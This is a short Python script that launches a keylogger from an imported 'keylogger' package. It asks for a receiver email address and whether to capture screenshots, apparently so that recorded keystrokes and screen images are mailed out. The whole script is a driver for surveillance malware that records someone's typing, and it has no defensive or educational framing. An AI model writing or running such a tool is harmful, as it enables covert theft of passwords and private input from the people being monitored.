from keylogger.keylogger import KeyLogger
logger = KeyLogger()
print('Enter : ctrl+D ; to stop keylogger at the end of a program...')
logger.keylogger(receiver_email=input('Receiver email : '),
                 ss=input('Takes screenshot ? (yes/no) : '))
